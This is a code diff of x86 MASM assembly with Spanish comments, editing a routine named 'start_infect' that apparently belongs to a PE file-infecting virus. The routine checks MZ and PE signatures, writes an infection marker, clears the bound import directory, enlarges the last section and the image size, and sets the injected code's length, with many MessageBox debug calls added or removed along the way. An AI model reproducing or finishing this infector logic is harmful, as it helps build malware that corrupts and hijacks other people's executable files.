@@ -52,27 +52,34 @@ start_infect PROC
   ; Simular el proceso de infección
 
     pushad
+      invoke MessageBoxA, NULL, addr msgText_2 , addr msgCaption_2, MB_OK
 
      mov filesize_sf, eax
-     invoke MessageBoxA, NULL, addr buffer_2, addr msgCaption, MB_OK
-     invoke MessageBoxA, NULL, addr msgText_2, addr msgCaption_db_1, MB_OK
+
+    
+
+    
+    
     ; Verificar la firma DOS
-    invoke MessageBoxA, NULL, esi, addr msgCaption, MB_OK 
+    invoke MessageBoxA, NULL, esi, addr msgCaption_2, MB_OK 
     cmp  WORD ptr [esi], "ZM"
     jne  infect_err
+    
 
     ; Verificar si el archivo ya está infectado
     mov  ecx, 042h
     cmp  dword ptr [esi + 034h], ecx
     je   infect_err
-    invoke MessageBoxA, NULL, addr msgCaption, addr msgCaption, MB_OK  
-    mov  dword ptr [esi + 034h], ecx 
+    ;invoke MessageBoxA, NULL, ecx, addr msgCaption, MB_OK  
 
+    mov  dword ptr [esi + 034h], ecx 
+      
     ; Verificar la firma "PE\0\0"
     add  esi, dword ptr [esi + 03ch]
     cmp  WORD ptr [esi], "EP"
     jne infect_err
     invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK 
+    
 
     ; Mover ESI al Optional Header
     push esi
@@ -80,12 +87,12 @@ start_infect PROC
     lea  ecx, dword ptr [esi + 02h]
     mov  esi, ecx
     pop  esi
-
+    push  esi
     ; Modificar DataDirectory[11] (Export Table Bound Headers)
     xor  ecx, ecx
     mov  dword ptr [esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY)], ecx
     mov  dword ptr [esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY) + 4], ecx
-invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK 
+
     ; Verificar Magic Number
   ;  cmp WORD ptr [esi], 0B01h
   ;  jne infect_err
@@ -119,7 +126,7 @@ invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK
     lea  ecx, dword ptr [esi + 03ch]
     lea  eax, dword ptr [ptr_sizeofheaders];4
     mov  eax, ecx
-
+    
     pop  esi
 
     add  esi, dword ptr [ptr_sizeofheaders]  ; esi -> IMAGE_SECTION_HEADER[0] "L"location
@@ -160,6 +167,9 @@ invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK
     add  edx, dword ptr [lastsec_virtualsize]
     
     invoke MessageBoxA, NULL, edx, addr msgCaption_db_1, MB_OK 
+    
+
+    
     push edx
     mov  edx, sectionalignment
     call ceil_align
@@ -167,11 +177,11 @@ invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK
     invoke MessageBoxA, NULL, edx, addr msgCaption_db_1, MB_OK 
    
     pop edx
-    
+
     mov  dword ptr [lastsec_virtualaddress], eax
     
     ;invoke MessageBoxA, NULL, eax, addr msgCaption_db_1, MB_OK 
-   
+
     ; Calcular el nuevo tamaño de la imagen
     lea  ecx, dword ptr [ptr_sizeofimage]
     mov  edx, dword ptr [ecx]
@@ -184,8 +194,10 @@ invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK
     call ceil_align
      
     pop edx
-    mov  dword ptr [ecx], eax
 
+
+    mov  dword ptr [ecx], eax
+    mov  filesize_sf, eax
     ; Escribir el código en el archivo mapeado
     lea  esi, dword ptr [ptr_sectionhdrtable]
     
@@ -203,17 +215,14 @@ invoke MessageBoxA, NULL, esi, addr msgCaption_db_1, MB_OK
     mov  eax, mycode_len
     mov  dword ptr [esi + 10h], eax
 
-   ; invoke WriteFile, hfile, addr mycodestart, mycode_len, addr numwrite, 0
-
-    invoke MessageBoxA, NULL, addr msgEnd, addr msgCaption, MB_OK
-  
+   
     jmp  fin
     
 infect_err:
     invoke MessageBoxA, NULL, addr msgError , addr msgCaption, MB_OK 
 
 fin:
-       
+    invoke MessageBoxA, NULL, addr  msgEnd, addr msgCaption_2, MB_OK 
     popad
     ret
 start_infect ENDP
